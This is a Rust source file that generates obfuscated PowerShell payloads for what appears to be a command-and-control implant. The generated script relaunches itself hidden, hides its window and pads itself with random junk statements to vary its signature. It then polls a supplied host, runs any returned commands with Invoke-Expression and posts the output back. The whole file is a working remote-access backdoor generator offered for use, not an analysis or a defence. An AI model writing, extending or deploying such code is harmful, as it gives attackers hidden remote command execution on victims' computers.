use rand::{distributions::Alphanumeric, Rng, thread_rng};

fn random(len: usize) -> String {
    thread_rng().sample_iter(&Alphanumeric)
        .take(len)
        .map(char::from)
        .collect()
}

fn junk() -> String {
    let mut rng = thread_rng();
    let ops = [
        format!("${}={};", random(5), rng.gen_range(0..100)),
        format!("${}='{}'.ToUpper();", random(5), random(10)),
        format!("[void](1..{}|%{{$null}});", rng.gen_range(2..7)),
        format!("${}=Get-Date;", random(5)),
    ];
    ops[rng.gen_range(0..ops.len())].clone()
}

pub fn payload(host: &str, v_id: &str) -> String {
    
    format!(
r#"
{junk1}
if ($null -eq $env:{hop_flag}) {{
            $env:{hop_flag} = '1'
            $c = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition))
            Start-Process powershell -ArgumentList "-NoP -W Hidden -Enc $c" -WindowStyle Hidden
            exit
        }}

        try {{
            $win = [Ref].Assembly.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('ShowWindow')
            $h = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle
            if ($h -ne [IntPtr]::Zero) {{
                $null = $win.Invoke($null, @($h, 0))
            }}
        }} catch {{
            $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(1,1)
        }}

{junk2}

$u = 'http://{host}/api/v1/{v_id}';
while($true){{
    try {{
        $resp = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 15).Content;
        if ($resp -and $resp -ne 'sleep') {{
            $out = (Invoke-Expression $resp 2>&1 | Out-String);
            Invoke-RestMethod -Uri $u -Method Post -Body $out -ContentType "text/plain";
        }}
    }} catch {{}}
    Start-Sleep -s 10
}}"#,  
    junk1 = junk(),
    hop_flag = format!("{}", random(10)),
    junk2 = junk(),
    host = host, 
    v_id = v_id
    )
}


